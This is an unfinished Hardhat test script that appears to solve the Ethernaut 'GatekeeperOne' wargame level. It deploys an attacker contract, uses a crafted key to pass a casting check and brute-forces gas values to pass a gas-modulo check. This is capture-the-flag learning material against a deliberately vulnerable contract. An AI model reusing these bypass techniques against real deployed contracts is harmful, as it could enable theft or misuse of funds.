// NOT COMPLETE
import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
   `0x9b261b23cE149422DE75907C6ac0C30cEc4e652A`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Update this to match your attack contract
  const attackerFactory = await ethers.getContractFactory(`GatekeeperOneAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    // We need to call an attacking contract to pass the first gatekeeping modifier
    // tx.origin in the target contract will be equal to eoa.getAddress()
    
    const address = await eoa.getAddress();
    console.log(`tx.origin address: ${address}`);
    
    // Get first 8 bytes of the wallet address
    //const key = ethers.utils.hexDataSlice(await eoa.getAddress(), 0, 8);
    
    // 9592 are the last two bytes of the EOA address.
    // The numbers in front will get cut off by the various casting functions
    // in gatekeeper part 3, but gatekeeper3 part two will fail if we pad with all zeroes
    // To do this in a more programmatic way you can use an array slice on the hex array
    // of 
    const key = `0x1000000000009592`; 
    console.log(`The key is ${key}`);
    //await attacker.setKey(key);
    //await attacker.gateOne();
    //await attacker.gateTwo();
    //await attacker.gateThree();

    //const gateOneAHex = await ethers.utils.hexlify(await attacker.gateOneA());
    //const gateOneBHex = await ethers.utils.hexlify(await attacker.gateOneB());
    //const gateTwoAHex = await ethers.utils.hexlify(await attacker.gateTwoA());
    //const gateTwoBHex = await ethers.utils.hexlify(await attacker.gateTwoB());
    //const gateThreeAHex = await ethers.utils.hexlify(await attacker.gateThreeA());

    //console.log(`Gate LHS:\t\t${gateOneAHex}`);
    //console.log(`Gate 1b:\t\t${gateOneBHex}`);
    //console.log(`Gate 2b (bad):\t\t${gateTwoBHex}`);
    //console.log(`Gate 3a:\t\t${gateThreeAHex}`);
    

    // Took cmichel's code here. The idea is to use a large baseline value of gas
    // And then incrementally add to it up to MOD at which point we should have
    // hit upon an acceptable value.
     const MOD = 8191
     const gasToUse = 800000
     for(let i = 0; i < MOD; i++) {
         console.log(`testing ${gasToUse + i}`)
         try {
             tx = await attacker.attack(key, gasToUse + i, {
                 gasLimit: `950000`
             });
             break;
         } catch {}
     }
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
